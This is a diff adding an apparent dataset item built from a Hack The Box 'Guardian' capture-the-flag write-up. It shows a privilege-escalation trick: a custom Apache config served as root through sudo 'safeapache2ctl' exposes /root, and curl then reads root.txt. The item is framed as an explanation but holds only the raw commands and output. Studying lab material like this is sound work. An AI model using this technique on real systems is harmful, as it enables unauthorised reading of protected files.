@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Guardian Hacks Stuff)
+
+CONTEXT:
+Source: Htb Guardian Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+configuration to read files from a server: LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so ServerName Test DocumentRoot /root LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so Listen 9000 ErrorLog /tmp/apache_error.log Now when I start this, the webserver will be up and listening for around ~5-10 seconds: mark@guardian:~/confs$ sudo safeapache2ctl -f ./0xdf.conf mark@guardian:~/confs$ netstat -tnlp | grep 9000 (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 0.0.0.0:9000 0.0.0.0:* LISTEN - mark@guardian:~/confs$ curl localhost:9000/root.txt ef91575c************************ From here I can read any file on the file system.
